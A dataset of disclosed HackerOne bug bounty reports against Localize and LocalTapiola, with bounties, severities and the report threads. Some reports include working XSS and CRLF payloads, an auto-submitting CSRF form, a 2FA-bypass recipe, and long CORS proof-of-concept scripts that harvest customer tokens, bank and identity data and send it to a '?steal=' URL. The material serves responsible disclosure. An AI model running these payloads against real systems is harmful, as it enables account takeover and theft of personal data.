Localize,11-50,0.0,1m-10m,$50.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,Stored XSS in Document Title,"thd3rboy  submitted a report to Localize.Aug 27th (about 1 year ago)Summary :
Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.
Vulnerable URL : https://app.localizestaging.com/documents
Payload XSS :
""><img src=x onerror=alert(document.domain)> 
Step to Reproduces :

Login to your account
Create Project
What are you translating? (select documents)
Upload Document
Input XSS payload in Document Title = ""><img src=x onerror=alert(document.domain)> 
Save it
XSS triggered

Impact
Can steal Cookie, Can run javascript code, and get information sensitive1 attachment:F1427466: Screenshot_20210827_205146.jpgthd3rboy   posted a comment. Aug 31st (about 1 year ago)Hello, please check this reportthd3rboy   posted a comment. Sep 8th (about 1 year ago)Hello, anyone here?jamesbinns   posted a comment. Sep 21st (about 1 year ago)Hi @thund3r17, we just deployed a fix for this. Would you please retest? Once you confirm it is fixed I will release the reward.thd3rboy   posted a comment. Sep 22nd (about 1 year ago)Hi @jamesbinns , I can't reproduce this problem, It seems the tags are being cleaned properly
Good Work!
Kind Regards,
ThunderLocalize  rewarded thd3rboy with a $50 bounty. Sep 22nd (about 1 year ago)@thd3r7 Releasing the reward now, thank you for your continued support.thd3rboy   posted a comment. Sep 22nd (about 1 year ago)Thank you for the bounty :)
Can we disclose this report?thd3rboy   posted a comment. Sep 25th (about 1 year ago)Hi @jamesbinns, Can you mark this report as completed?
Can we disclose this report??jamesbinns   closed the report and changed the status to Resolved. Sep 27th (about 1 year ago)thd3rboy   requested to disclose this report. Sep 27th (about 1 year ago)paton Localize staff  agreed to disclose this report. Sep 27th (about 1 year ago)  This report has been disclosed. Sep 27th (about 1 year ago)",https://hackerone.com/reports/1321407,California,United States,San Francisco,2021,8,27,14,0
Localize,11-50,0.0,1m-10m,$500.00,Medium,5.45,Business Logic Errors,2-factor authentication can be disabled when logged in without confirming account password,"zerboa  submitted a report to Localize.Jan 25th (3 years ago)Description
When users wants to Disable his/her TwoFactor Authentication, they have to know their account password. But using this vulnerability They don't need password to disable it. this will allow hacker who get someone cookie to disabling twofactor auth and also Fullytakeover the account.
How To Reproduce

Open Your BurpSuite and Turn on the intercept
Go To 2Factor Authentication page click the red buttons ""Disable two factor ....""
Put any wrong password and copy all the header
Go to repeater and make a POST request to https://localizestaging.com/api/user/two-factor/set also Paste the header here.
add a body request like this method=sms&phone=%2B62-hacker-phone-number then click GO
Bypassed !

Impact
disable twofactor authentication without needing to know the password1 attachment:F696018: localizejs-poc.mp4zerboa   posted a comment. Jan 27th (3 years ago)Check this report plzpaton Localize staff  posted a comment. Jan 28th (3 years ago)We are investigating and trying to confirm the report. Thank youzerboa   posted a comment. Jan 28th (3 years ago)any update ?jamesbinns   updated the severity from medium to low. Jan 28th (3 years ago)jamesbinns   closed the report and changed the status to Not Applicable. Jan 28th (3 years ago)We were able to reproduce this in Burp, but the result is purely a UI change. If you refresh the page 2FA is still enabled since it was not disabled on the server.zerboa   posted a comment. Jan 28th (3 years ago)Hi, im disaggre with what you say.
here is the better POC, and please DONT CLOSE REPORT AS N/A IF YOU NO CHECK IT YET !
DONT MAKE ME LOSE MY POINTS FOR VALID ISSUE. 1 attachment:F699149: WATCHIT!!!!!!.mp4paton Localize staff  reopened this report. Jan 29th (3 years ago)paton Localize staff  updated the severity from low to medium. Jan 29th (3 years ago)paton Localize staff  changed the status to Triaged. Jan 29th (3 years ago)@intr0ver7 Thank you for following up with additional information to help us understand how to reproduce the problem. We have verified the issue and will release a fix very soon. Thank you again for your report.zerboa   posted a comment. Jan 29th (3 years ago)Thx paton. Is the bounty come after Resolved or I Will get this asap ?Localize  rewarded zerboa with a $500 bounty. Jan 29th (3 years ago)zerboa   posted a comment. Jan 29th (3 years ago)Please remind this issue #784730 . There is an attack vector ... What you is wrong..paton Localize staff  closed the report and changed the status to Resolved. Feb 4th (3 years ago)zerboa   posted a comment. Feb 4th (3 years ago)Thx !zerboa   requested to disclose this report. Feb 8th (3 years ago)Can we disclose this issue ?zerboa   posted a comment. Feb 8th (3 years ago)also @Paton im really soory for being a bad hacker. i tought you not be offended by what i said before. please unbanned me from this program coz i found new issue, and i think this is a valid one. and once again im so soory -/- paton Localize staff  changed the report title from Password needed bypass when Disable a TwoFactorAuthentication to 2-factor authentication can be disabled when logged in without confirming account password. Feb 10th (3 years ago)paton Localize staff  agreed to disclose this report. Feb 10th (3 years ago)  This report has been disclosed. Feb 10th (3 years ago)",https://hackerone.com/reports/783258,California,United States,San Francisco,2020,1,25,17,17
LocalTapiola,1001-5000,0.0,over-1b,$50.00,No value,0.0,Violation of Secure Design Principles,/icons/README is still available on viestinta.lahitapiola.fi,delimitry  submitted a report to LocalTapiola.Feb 22nd (6 years ago)localtapiola-thomas LocalTapiola staff  posted a comment. Feb 22nd (6 years ago)localtapiola-thomas LocalTapiola staff  changed the status to Triaged. Feb 23rd (6 years ago)localtapiola-thomas LocalTapiola staff  closed the report and changed the status to Resolved. Feb 23rd (6 years ago)LocalTapiola  rewarded delimitry with a $50 bounty. Feb 23rd (6 years ago)localtapiola-thomas LocalTapiola staff  requested to disclose this report. Mar 12th (6 years ago)delimitry   agreed to disclose this report. Mar 12th (6 years ago)  This report has been disclosed. Mar 12th (6 years ago),https://hackerone.com/reports/208141,Espoo,Finland,Espoo,2017,2,22,11,5
LocalTapiola,1001-5000,0.0,over-1b,$100.00,No value,0.0,Information Disclosure,Amazon Bucket Accessible (http://inpref.s3.amazonaws.com/),"xmly  submitted a report to LocalTapiola.May 10th (7 years ago)Searching through the source code of your homepage shows a few http://inpref.s3.amazonaws.com/ URLS.
I assume that you own this s3 Amazon bucket.
The problem here is, visiting that amazon bucket on a browser will shows the files on the bucket, whilst a secure bucket would bring up an access denied page. I have attached Screenshots showing Hackerone's bucket compared to your bucket to show you what a secure bucket looks like and where the bucket is being used in your source code.3 attachments:F92489: Inpref_1.pngF92490: Screenshot_138.pngF92491: Screenshot_136.png",https://hackerone.com/reports/137487,Espoo,Finland,Espoo,2016,5,10,13,42
LocalTapiola,1001-5000,0.0,over-1b,$300.00,No value,0.0,Privilege Escalation,Abusing and Hacking the SMTP Server secure.lahitapiola.fi,aaditya_purani  submitted a report to LocalTapiola.May 12th (7 years ago)localtapiola-thomas LocalTapiola staff  posted a comment. May 12th (7 years ago)aaditya_purani   posted a comment. May 13th (7 years ago)localtapiola-thomas LocalTapiola staff  posted a comment. May 16th (7 years ago)aaditya_purani   posted a comment. May 17th (7 years ago)LocalTapiola  rewarded aaditya_purani with a $300 bounty. May 18th (7 years ago)localtapiola-thomas LocalTapiola staff  closed the report and changed the status to Resolved. May 18th (7 years ago)localtapiola-thomas LocalTapiola staff  requested to disclose this report. May 18th (7 years ago)localtapiola-thomas LocalTapiola staff  changed the report title. May 18th (7 years ago)aaditya_purani   posted a comment. May 20th (7 years ago)localtapiola-thomas LocalTapiola staff  reopened this report. May 20th (7 years ago)localtapiola-thomas LocalTapiola staff  closed the report and changed the status to Resolved. May 20th (7 years ago)localtapiola-thomas LocalTapiola staff  requested to disclose this report. Updated May 20th (7 years ago)aaditya_purani   agreed to disclose this report. May 20th (7 years ago)  This report has been disclosed. May 20th (7 years ago),https://hackerone.com/reports/138315,Espoo,Finland,Espoo,2016,5,12,15,10
LocalTapiola,1001-5000,0.0,over-1b,$600.00,High,7.95,None,Blacklist bypass for /cs/Satellite (www.lahitapiola.fi),bobrov  submitted a report to LocalTapiola.Jan 16th (6 years ago),https://hackerone.com/reports/198718,Espoo,Finland,Espoo,2017,1,16,12,46
LocalTapiola,1001-5000,0.0,over-1b,$100.00,No value,0.0,Violation of Secure Design Principles,Content Spoofing or Text Injection (404 error page injection on yrityspalvelu),"ng1  submitted a report to LocalTapiola.Apr 25th (7 years ago)Vulnerability Description: Application allows users to inject any content on the 404 not found webpage
Vulnerable Location: https://yrityspalvelu.tapiola.fi/a1/has%20been%20changed%20by%20a%20new%20one%20https://www.attacker.com%20so%20go%20to%20the%20new%20one%20since%20this%20one
Fix : just use a 404 page that don't include attacker text
Reference links: Below are the links which will help you to understand more about this issue including the remediation
https://hackerone.com/reports/106350
https://hackerone.com/reports/102327
https://hackerone.com/reports/1118601 attachment:F89366: Content_Injection.png",https://hackerone.com/reports/134388,Espoo,Finland,Espoo,2016,4,25,11,39
LocalTapiola,1001-5000,0.0,over-1b,$100.00,No value,0.0,Violation of Secure Design Principles,Cleartext protocol after bank authentication (yrityspalvelu.tapiola.fi),muon4  submitted a report to LocalTapiola.Dec 22nd (5 years ago)localtapiola-thomas LocalTapiola staff  posted a comment. Dec 23rd (5 years ago)muon4   posted a comment. Updated Dec 23rd (5 years ago)localtapiola-thomas LocalTapiola staff  posted a comment. Dec 23rd (5 years ago)muon4   posted a comment. Updated Dec 24th (5 years ago)localtapiola-thomas LocalTapiola staff  changed the status to Triaged. Jan 4th (5 years ago)muon4   posted a comment. Jan 4th (5 years ago)LocalTapiola  rewarded muon4 with a $100 bounty. Jan 4th (5 years ago)muon4   posted a comment. Jan 5th (5 years ago)localtapiola-thomas LocalTapiola staff  changed the report title. Jan 14th (5 years ago)localtapiola-thomas LocalTapiola staff  closed the report and changed the status to Resolved. Jan 14th (5 years ago)localtapiola-thomas LocalTapiola staff  requested to disclose this report. Jan 14th (5 years ago)muon4   posted a comment. Jan 14th (5 years ago)muon4   posted a comment. Jan 14th (5 years ago)localtapiola-thomas LocalTapiola staff  reopened this report. Jan 14th (5 years ago)localtapiola-thomas LocalTapiola staff  closed the report and changed the status to Resolved. Jan 14th (5 years ago)localtapiola-thomas LocalTapiola staff  requested to disclose this report. Jan 14th (5 years ago)muon4   agreed to disclose this report. Jan 14th (5 years ago)  This report has been disclosed. Jan 14th (5 years ago),https://hackerone.com/reports/300104,Espoo,Finland,Espoo,2017,12,22,19,10
LocalTapiola,1001-5000,0.0,over-1b,"$3,000.00",Critical,9.0,Cross-site Scripting (XSS) - Generic,Blind Stored XSS Against Lahitapiola Employees - Session and Information leakage,"putsi  submitted a report to LocalTapiola.Aug 15th (6 years ago)Hi,
I am pretty sure that I found a vulnerability similar to https://hackerone.com/reports/135154.
An adversary can use the ""Lähetä viesti""-functionality of the LähiTapiola Asiakassalkku to send a malicious file. When the customer service opens the file, an XSS will execute and will leak user IP address and Lähitapiola session cookies and also for example the ""tapiola.cem.uid"" which I suspect is the username of the employee (e.g. ""██████████"").
Steps to reproduce:

Log in to the Lähitapiola customer site (https://www.lahitapiola.fi/henkilo/asiakaspalvelu/asioi-verkossa/kirjaudu-verkkoon).
Navigate to the ""Lähetä viesti""-page (https://verkkopalvelu.tapiola.fi/a2/AskoWeb/faces/sivut/viesti/laheta.xhtml).
Fill the fields with anything you want and click the ""Lataa liite""-button and upload a malicious file (see the attached file kirje.txt).
Send the message.
Navigate to ""Postilaatikko"" and make sure that the message was sent and that the attachment is properly uploaded (see the attached image1.png and image2.png).
The attached kirje.txt contains a SVG image file which is modified to contain malicious javascript that sends an AJAX-request to attacker's server (mine) and adds website cookies to the URL as GET-parameter. As the Lähitapiola employees are probably using Internet Explorer, the IE will sniff the MIME type from the file and open it as SVG instead of text/plain and it will trigger the XSS.

Proof of exploitation
See the attacked file xsspoc.txt for an proof. The file is from my nginx-server logs and in the file you can see that an Lahitapiola employee (notice the IP-address) has opened the attachment and it triggered the XSS which sent the employees cookies to my server. 3 attachments:F112342: kirje.txtF112343: image2.pngF112344: image1.pngSummary by putsiPublic Service Announcement
Fellow hackers, please don't blindly open/execute files that you download from HackerOne reports.
After this report was disclosed, the attached XSS payload-files have contacted my server over 50 times. I even received someone's cookies for some web service.",https://hackerone.com/reports/159498,Espoo,Finland,Espoo,2016,8,15,15,36
LocalTapiola,1001-5000,0.0,over-1b,"$1,984.00",High,7.95,None,"CORS misconfiguration allows to steal client's ""password"", Authorization token and the customer details e.g. names, SSN, bank account etc.","muon4  submitted a report to LocalTapiola.Sep 5th (3 years ago)Summary by muon4CORS misconfiguration allowed to steal customer details e.g. name, SSN, bank account and other customer critical information from logged users.
Program handled report very well and gave me a reasonable bounty. Thanks!
Here is the PoC code:
Code 2.22 KiB1<!DOCTYPE html>
2<html>
3<body>
4<center>
5<h3>Steal customer data!</h3>
6
7<div id=""demo"">
8</div>
9
10<script>
11function cors() {
12  var xhttp = new XMLHttpRequest();
13  xhttp.onreadystatechange = function() {
14    if (this.readyState == 4 && this.status == 200) {
15    var parse = JSON.parse(this.response);
16    window.uid = parse.cel_uuid;  
17    setTimeout(cors2, 500);
18    }
19  };
20  xhttp.open(""GET"", ""https://ext-gw.lahitapiola.fi:7000/local-tapiola/lt-ext-prod/api/preOAuth"", true);
21  xhttp.withCredentials = true;
22  xhttp.setRequestHeader(""X-IBM-Client-Id"", ""84214774-3012-4b7f-a7a5-278188a90c9e"");
23  xhttp.send();
24}
25
26function cors2()
27{
28  var xhttp = new XMLHttpRequest();
29  xhttp.onreadystatechange = function() {
30    if (this.readyState == 4 && this.status == 200) {
31    var parse = JSON.parse(this.response);
32    window.token2 = parse.access_token;
33    setTimeout(cors3, 500);
34    }
35  };
36  xhttp.open(""POST"", ""https://ext-gw.lahitapiola.fi:7000/local-tapiola/lt-ext-prod/api/oauth/oauth2/token"", true);
37  xhttp.withCredentials = true;
38  xhttp.setRequestHeader(""X-IBM-Client-Id"", ""84214774-3012-4b7f-a7a5-278188a90c9e"");
39  xhttp.setRequestHeader(""Content-Type"", ""application/x-www-form-urlencoded; charset=UTF-8"")
40  var params = ""grant_type=password&client_id=84214774-3012-4b7f-a7a5-278188a90c9e&username=mfnol&password=""+uid+""&scope=scope1"";
41  xhttp.send(params);
42}
43
44function cors3()
45{
46  var xhttp = new XMLHttpRequest();
47  xhttp.onreadystatechange = function() {
48    if (this.readyState == 4 && this.status == 200) {
49    document.getElementById(""demo"").innerHTML = alert(this.responseText);
50    window.response = this.responseText;
51    setTimeout(cors4, 500);
52    }
53  };
54  xhttp.open(""GET"", ""https://ext-gw.lahitapiola.fi:7000/local-tapiola/lt-ext-prod/api/customerInformation"", true);
55  xhttp.withCredentials = true;
56  xhttp.setRequestHeader(""X-IBM-Client-Id"", ""84214774-3012-4b7f-a7a5-278188a90c9e"");
57  xhttp.setRequestHeader(""Content-Type"", ""application/x-www-form-urlencoded; charset=UTF-8"")
58  xhttp.setRequestHeader(""Authorization"", ""Bearer ""+token2);
59  xhttp.send();
60}
61function cors4()
62{
63var xhttp = new XMLHttpRequest();
64xhttp.open(""GET"", ""http://localhost/?steal=""+encodeURI(response), true);
65xhttp.withCredentials = true;
66xhttp.send();
67}
68cors()
69</script>
70
71</body>
72</html>",https://hackerone.com/reports/688567,Espoo,Finland,Espoo,2019,9,5,9,51
LocalTapiola,1001-5000,0.0,over-1b,$200.00,Medium,5.45,Cross-Site Request Forgery (CSRF),Brute force unsubscription on /webApp/unsub_sb (viestinta.lahitapiola.fi),"mr_edwards  submitted a report to LocalTapiola.Feb 22nd (6 years ago)Basic report information
Summary:
CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim's behalf
Description: Any user subscribed to Active Campaign, or admin too, attacker will able to unsubscribe using CSRF attack.
Domain: http://viestinta.lahitapiola.fi
Browsers / Apps Verified In:

[Firefox latest version]

Steps To Reproduce:

go to this link : http://viestinta.lahitapiola.fi/webApp/unsub_sb?id=X2Fi4JiOfQdh0HkKT1xfrvO0vN5UTXiI6kcSQlQgAgA%3D
Click on Bekrafta annullering and intercept the traffic
Image F162916: Screenshot_from_2017-02-22_23-25-50.png 63.69 KiBZoom in Zoom out Copy Download
3: intercept the traffic {i am using burpsuite here}, and create CSRF poc
Image F162918: Screenshot_from_2017-02-22_23-27-34.png 127.62 KiBZoom in Zoom out Copy Download
4: send that HTML to victim and done, user unsubscribed from the service.

Additional material

Screenshots

Let me know if any further information is required.
Thanks
Regards
Neeraj2 attachments:F162916: Screenshot_from_2017-02-22_23-25-50.pngF162918: Screenshot_from_2017-02-22_23-27-34.pnglocaltapiola-thomas LocalTapiola staff  posted a comment. Feb 22nd (6 years ago)Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.
This is not CSRF as there is no identity nor are there any privileges. It's just a link, a brute force link.
Our security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.
Note: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-reportlocaltapiola-thomas LocalTapiola staff  changed the report title from CSRF to remove any user from Active Campaign subscription to Brute force unsubscribe user from /webApp/unsub_sb (viestinta.lahitapiola.fi). Feb 22nd (6 years ago)localtapiola-thomas LocalTapiola staff  changed the report title from Brute force unsubscribe user from /webApp/unsub_sb (viestinta.lahitapiola.fi) to Brute force unsubscription on /webApp/unsub_sb (viestinta.lahitapiola.fi). Feb 22nd (6 years ago)localtapiola-thomas LocalTapiola staff  posted a comment. Feb 24th (6 years ago)This is now fixed, please retest. Bounty decisions are to be made in a few weeks, so patience.mr_edwards   posted a comment. Feb 24th (6 years ago)Hey,
Fixed Now.
Thanksmr_edwards   updated the severity to medium. Feb 28th (6 years ago)mr_edwards   posted a comment. Mar 10th (6 years ago)Hey,
Any updates?
ThanksLocalTapiola  rewarded mr_edwards with a $200 bounty. Mar 18th (6 years ago)We have decided on a bounty.localtapiola-thomas LocalTapiola staff  closed the report and changed the status to Resolved. Mar 18th (6 years ago)Closing as resolved.localtapiola-thomas LocalTapiola staff  requested to disclose this report. Mar 18th (6 years ago)Full disclosure.mr_edwards   agreed to disclose this report. Mar 19th (6 years ago)Thanks for bounty :)  This report has been disclosed. Mar 19th (6 years ago)",https://hackerone.com/reports/208237,Espoo,Finland,Espoo,2017,2,22,18,3
LocalTapiola,1001-5000,0.0,over-1b,"$2,100.00",Critical,9.5,Violation of Secure Design Principles,CORS misconfiguration allows to steal customers data ,"muon4  submitted a report to LocalTapiola.May 12th (4 years ago)Summary by muon4I found an interesting bug from the LocalTapiola's verkkopalvelu. This bug was a sitewide CORS misconfiguration. This misconfiguration allowed an attacker to bypass  SOP and get READ and WRITE access to the logged customer's profiles.
After some interesting discussion the program handled the report very well and awarded me reasonable bounty.
The PoC code is quite long because I needed to prove the real impact of this vulnerability so I parsed all the critical customer information and logged it to the console. In the real-life scenario this data would be sent to the attacker's server. 
However here is my PoC code (Yes I know - you could probably do a way cleaner PoC):
Code 5.05 KiB1<!DOCTYPE html>
2<meta charset=""UTF-8""> 
3<html>
4<body>
5<div id=""demo"">
6</div>
7
8<script>
9function cors() {
10  var xhttp = new XMLHttpRequest();
11  xhttp.onreadystatechange = function() {
12    if (this.readyState == 4 && this.status == 200) {
13
14    //Let's make a variable called ""parse""
15    var parse = JSON.parse(this.responseText);
16
17    //Parse the firstname and the lastname from the response
18    var nimi = parse.etunimi+"" ""+parse.sukunimi;
19    
20	//Parse the address from the response
21    var osoite = parse.yhteystiedot.lahiosoite;
22
23    //Parse the email address from the response
24    var mail = parse.yhteystiedot.sahkopostiosoite;
25
26    //Parse the bank account from the response
27    var tili = parse.tilit[0].tilinumero;
28
29    //Let's make global variable called 'viesti' which we can write to the console – In the real life scenario this data would be sent to the attacker's server. Also, echo some content to the web page.
30    window.viesti = ""Hei ""+nimi+""<br>Osoitteesi on: ""+osoite+""<br>Sähköpostiosoitteesi on: ""+mail+""<br>Tilinumerosi on ""+tili;
31    console.log(viesti);
32
33    //Small break and execute function called 'CSRF'    
34    setTimeout(CSRF, 500); 
35    }
36    else{
37    //This was to ensure that we can first trick the user to login and keep script running :)
38	setTimeout(cors, 5000);
39    }
40  };
41  xhttp.open(""GET"", ""https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/api/asiakastiedot"", true);
42  xhttp.withCredentials = true;
43  xhttp.send();
44}
45//In the first place let's wait two seconds so we can trick victim to log in
46setTimeout(cors, 2000);
47
48
49function CSRF() {
50  var xhttp = new XMLHttpRequest();
51  xhttp.onreadystatechange = function() {
52    if (this.readyState == 4 && this.status == 200) {
53      document.getElementById(""demo"").innerHTML = xhttp.responseText;
54      function getMeta(metaName) {
55      
56      //CSRF token was at meta tag so let's steal it.
57      const metas = document.getElementsByTagName('meta');
58      for (let i = 0; i < metas.length; i++) {
59            if (metas[i].getAttribute('name') === metaName) {
60          return metas[i].getAttribute('content');
61    }
62  }
63  return '';
64}   
65
66//Generate the global variable called 'token'. Which is basicly the value of the '_csrf' and write it to the console
67window.token=getMeta('_csrf');
68console.log(""CSRF-token: ""+token);
69    }
70  };
71  xhttp.open(""GET"", ""https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/kirjautunut/?lang=fi"", true);
72  xhttp.withCredentials = true;
73  xhttp.send();
74
75  //Small break and let's execute to the function called 'VIESTIT'
76  setTimeout(VIESTIT, 500);  
77
78} 
79
80
81function VIESTIT() {
82  var xhttp = new XMLHttpRequest();
83  xhttp.onreadystatechange = function() {
84    if (this.readyState == 4 && this.status == 200) {
85    var parse = JSON.parse(this.responseText);
86    
87    //Again some JSON parsing and reading all the 'ketjuID' and 'hash' values and put those as a value of the global variables 'ketju' and' hash'. After that let's execute 'VIESTIT2' function inside this for-loop
88
89    for (var i = 0; i < parse.length; i++){
90       window.ketju = parse[i].ketjuId;
91       window.hash = parse[i].hash;
92       VIESTIT2();
93     }
94    //After the for-loop is over let's execute the function called 'LASKUT'
95    setTimeout(LASKUT, 500);
96    }
97  };
98  xhttp.open(""GET"", ""https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/api/viestit"", true);
99  xhttp.withCredentials = true;
100  xhttp.send();
101} 
102
103function VIESTIT2() {
104  var xhttp3 = new XMLHttpRequest();
105  xhttp3.onreadystatechange = function() {
106  if (this.readyState == 4 && this.status == 200) {
107       
108      //Get all the messages inside earlier for-loop in function VIESTIT and write the content to the console
109      document.getElementById(""demo"").innerHTML = console.log(this.responseText);
110    }
111  };
112
113  xhttp3.open(""GET"", ""https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/api/viestit/""+ketju+""/?hash=""+hash, true);
114  xhttp3.withCredentials = true;
115  xhttp3.send();
116}
117
118function LASKUT() {
119  var xhttp = new XMLHttpRequest();
120  xhttp.onreadystatechange = function() {
121    if (this.readyState == 4 && this.status == 200) {
122 
123    //Parse some JSON with the for loop. What we want is to read right paths to the private invoices and get the hash values. Then we execute the function called 'LASKUT2' and get access to the content of the invoices.
124
125    var parse = JSON.parse(this.responseText);
126
127    //For loop for reading the content of the invoices.
128    for (var i = 0; i < parse.laskut.length; i++){
129    window.polku = parse.laskut[0].liite.polku;
130    window.hash = parse.laskut[0].liite.hash;
131    setTimeout(LASKUT2, 500)
132    }
133    }
134  };
135  xhttp.open(""GET"", ""https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/api/laskut"", true);
136  xhttp.withCredentials = true;
137  xhttp.send();
138} 
139
140
141function LASKUT2() {
142  var xhttp3 = new XMLHttpRequest();
143  xhttp3.onreadystatechange = function() {
144    if (this.readyState == 4 && this.status == 200) {
145      document.getElementById(""demo"").innerHTML = console.log(this.responseText);
146    }
147  };
148  xhttp3.open(""GET"", ""https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/""+polku+""/?hash=""+hash, true);
149  xhttp3.withCredentials = true;
150  xhttp3.send();
151}
152
153
154</script>
155</body>
156</html>",https://hackerone.com/reports/577969,Espoo,Finland,Espoo,2019,5,12,10,44
LocalTapiola,1001-5000,0.0,over-1b,$500.00,Medium,4.3,Cross-Site Request Forgery (CSRF),"CSRF allows attacker to delete item from customer's ""Postilaatikko""","putsi  submitted a report to LocalTapiola.Mar 15th (7 years ago)Description
If the customer navigates to the CSRF-attack page shortly after viewing any message details on the ""Postilaatikko"", the last item that was viewed by the customer will be deleted.
Please see the attached video for an illustration of the bug.
Steps to reproduce

Log in to the Lähitapiola.
Navigate to ""Vakuutukset"" --> ""Postilaatikko"".
Open the details page of e.g. ""Asiakastietomuutos""-message.
(optional) Navigate to any other page of Lähitapiola-website or click the ""Takaisin postilaatikkoon""-button.
Open the CSRF-attackpage.
Notice that the message was deleted due to the CSRF-request.

Proof of concept
Code 361 BytesWrap lines Copy Download1<html>
2  <!-- CSRF PoC - generated by Burp Suite Professional -->
3  <body>
4    <form action=""https://verkkopalvelu.tapiola.fi/a2/AsiakassalkkuWeb/naytaviestiketju.do"">
5      <input type=""hidden"" name=""mn"" value=""p"" />
6      <input type=""submit"" value=""Submit request"" />
7    </form>
8    <script>
9      document.forms[0].submit();
10    </script>
11  </body>
12</html>",https://hackerone.com/reports/123339,Espoo,Finland,Espoo,2016,3,15,14,40
LocalTapiola,1001-5000,0.0,over-1b,$400.00,No value,0.0,None,CRLF injection in https://verkkopalvelu.lahitapiola.fi/,"derision  submitted a report to LocalTapiola.Mar 8th (7 years ago)Hi there,
There is an HTTP header injection on https://verkkopalvelu.lahitapiola.fi/a6/VerkkokauppaYTWAR/YT/Etusivu.jsf it allow an attacker to set custom cookies and custom content (such as XSS attack) within the response.
PoC:
The parameter p is vulnerable.
https://verkkopalvelu.lahitapiola.fi/a6/VerkkokauppaYTWAR/YT/Etusivu.jsf?productMode=YT&locale=fi<app=LT_Yksityistapaturmalaskuri&p=1412889500323ew2du7e081azeza%22%27%3E%3C%0D%0A+%0D%0A+%3Csvg/onload=alert%28document.domain%29%3E&selectedLanguage=fi&selectedArea=
Screen: CRLF_poc.png1 attachment:F77338: CRLF_poc.png",https://hackerone.com/reports/121489,Espoo,Finland,Espoo,2016,3,8,22,19
LocalTapiola,1001-5000,0.0,over-1b,$150.00,Low,2.0,None,Creating arbitrary cookies values /cs/CookieServer (www.lahitapiola.fi),bobrov  submitted a report to LocalTapiola.Dec 20th (6 years ago),https://hackerone.com/reports/192618,Espoo,Finland,Espoo,2016,12,20,4,42
LocalTapiola,1001-5000,0.0,over-1b,$50.00,Medium,5.3,Cross-site Scripting (XSS) - Generic,CSRF bypass + XSS on verkkopalvelu.tapiola.fi,b6117130df17feef13481e3  submitted a report to LocalTapiola.Jan 24th (6 years ago),https://hackerone.com/reports/200683,Espoo,Finland,Espoo,2017,1,24,6,55
LocalTapiola,1001-5000,0.0,over-1b,$50.00,Medium,5.45,Violation of Secure Design Principles,CSRF possible when SOP Bypass/UXSS is available,bugdiscloseguys  submitted a report to LocalTapiola.Feb 18th (6 years ago),https://hackerone.com/reports/207399,Espoo,Finland,Espoo,2017,2,18,19,50
LocalTapiola,1001-5000,0.0,over-1b,$50.00,Low,2.0,Violation of Secure Design Principles,Disclosure of IBM Websphere page,"whitehattushu  submitted a report to LocalTapiola.Nov 23rd (6 years ago)while testing i found that ibm websphere page was disclosed and also server version is 8.5.5 which is older version
Poc-
go to
https://verkkopalvelu.tapiola.fi/a1/
as general practice such pages should not be disclosed1 attachment:F136392: Screenshot_2016-11-23-16-15-58.pnglocaltapiola-thomas LocalTapiola staff  posted a comment. Nov 23rd (6 years ago)Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.
Our security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.whitehattushu   posted a comment. Nov 28th (6 years ago)@localtapiola-thomas any updates???localtapiola-thomas LocalTapiola staff  posted a comment. Nov 28th (6 years ago)Our bug bounty management team meeting is in two weeks, we will know more by then. A technical information leak without any clear and proven business impact is usually not awarded with bounties.localtapiola-thomas LocalTapiola staff  changed the report title from Disclosure of ibm websphere page to Disclosure of ibm websphere page (verkkopalvelu.tapiola.fi). Dec 6th (6 years ago)whitehattushu   posted a comment. Dec 7th (6 years ago)any updates????whitehattushu   posted a comment. Dec 8th (6 years ago)@localtapiola-thomas any updates???localtapiola-thomas LocalTapiola staff  posted a comment. Dec 10th (6 years ago)No updates. This will most likely be closed as informative with no bounty, according to our policy. This is handled as a low priority issue and there might be updates in January.localtapiola-thomas LocalTapiola staff  changed the report title from Disclosure of ibm websphere page (verkkopalvelu.tapiola.fi) to Disclosure of IBM Websphere page. Dec 12th (6 years ago)localtapiola-thomas LocalTapiola staff  updated the severity to low. Dec 12th (6 years ago)LocalTapiola  rewarded whitehattushu with a $50 bounty. Jan 17th (6 years ago)localtapiola-thomas LocalTapiola staff  closed the report and changed the status to Resolved. Jan 17th (6 years ago)Thank you for reporting this issue.localtapiola-thomas LocalTapiola staff  requested to disclose this report. Jan 18th (6 years ago)Requesting full disclosure.whitehattushu   agreed to disclose this report. Jan 19th (6 years ago)  This report has been disclosed. Jan 19th (6 years ago)",https://hackerone.com/reports/184452,Espoo,Finland,Espoo,2016,11,23,10,52
LocalTapiola,1001-5000,0.0,over-1b,$490.00,High,7.2,Insecure Direct Object Reference (IDOR),Authorization issue on 'valtakirjat' (/e2/verkkopalvelu/),muon4  submitted a report to LocalTapiola.Jan 22nd (5 years ago),https://hackerone.com/reports/307978,Espoo,Finland,Espoo,2018,1,22,19,7
LocalTapiola,1001-5000,0.0,over-1b,$100.00,No value,0.0,Information Disclosure,Oracle WebCenter Sites Support Tools available and Information disclosure (/cs/Satellite),"rpinuaga  submitted a report to LocalTapiola.Aug 30th (6 years ago)Oracle WebCenter Sites Support Tools are available in: www.lahitapiola.fi
